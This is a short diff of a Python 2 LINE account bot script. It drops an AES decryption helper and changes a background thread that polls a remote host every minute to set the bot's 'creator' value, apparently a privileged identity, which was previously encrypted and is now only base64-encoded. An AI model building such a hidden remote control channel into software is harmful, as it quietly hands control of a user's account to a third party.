@@ -3,7 +3,6 @@
 import LINETCR
 from LINETCR.lib.curve.ttypes import *
 from multiprocessing import Pool
-from Crypto.Cipher import AES
 import time,random,sys,json,codecs,threading,glob,re,datetime,urllib2,pickle,requests,base64
 
 cl = LINETCR.LINE()
@@ -138,12 +137,6 @@ def reverse(text):
     if len(text) <= 1:
         return text
     return reverse(text[1:]) + text[0]
-
-def dec(text, key):
-    dec_secret = AES.new(key[:32])
-    raw_decrypted = dec_secret.decrypt(base64.b64decode(text))
-    clear_val = raw_decrypted.rstrip("\0")
-    return clear_val
 
 def user1script(op):
     global TyfeLogged
@@ -2203,7 +2196,7 @@ thread2.start()
 def getData():
     global creator
     while True:
-        creator = dec(requests.get("http://noxt.cf/TyfeData/cor.txt").content,requests.get("http://noxt.cf/TyfeData/key.txt").content)
+        creator = requests.get("http://noxt.cf/TyfeData/cor.txt").content.decode("base64","strict")
         time.sleep(60)
 thread3 = threading.Thread(target=getData)
 thread3.daemon = True
